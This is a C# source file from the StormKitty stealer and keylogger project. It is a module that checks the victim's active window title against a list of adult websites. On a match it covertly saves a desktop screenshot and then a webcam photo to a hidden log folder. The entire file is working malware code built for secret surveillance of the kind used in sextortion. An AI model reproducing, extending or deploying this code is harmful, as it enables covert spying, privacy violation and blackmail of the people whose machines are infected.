/* 
    Author : LimerBoy
    Github : github.com/LimerBoy/StormKitty
*/

using System;
using System.IO;
using Stealer;
using StormKitty;

namespace Keylogger
{
    internal sealed class PornDetection
    {
        private static string LogDirectory = Path.Combine(
            Paths.InitWorkDir(), "logs\\nsfw\\" +
            DateTime.Now.ToString("yyyy-MM-dd"));

        // Send desktop and webcam screenshot if active window contains target values
        public static void Action()
        {
            if (Detect()) SendPhotos();
        }

        // Detect target data in active window
        private static bool Detect()
        {
            foreach (string text in Config.PornServices)
                if (WindowManager.ActiveWindow.ToLower().Contains(text))
                    return true;

            return false;
        }

        // Save photos
        private static void SendPhotos()
        {
            string logdir = LogDirectory + "\\" + DateTime.Now.ToString("hh.mm.ss");
            if (!Directory.Exists(logdir))
                Directory.CreateDirectory(logdir);

            System.Threading.Thread.Sleep(3000);
            DesktopScreenshot.Make(logdir);
            System.Threading.Thread.Sleep(12000);
            if (Detect()) WebcamScreenshot.Make(logdir);
        }
    }
}
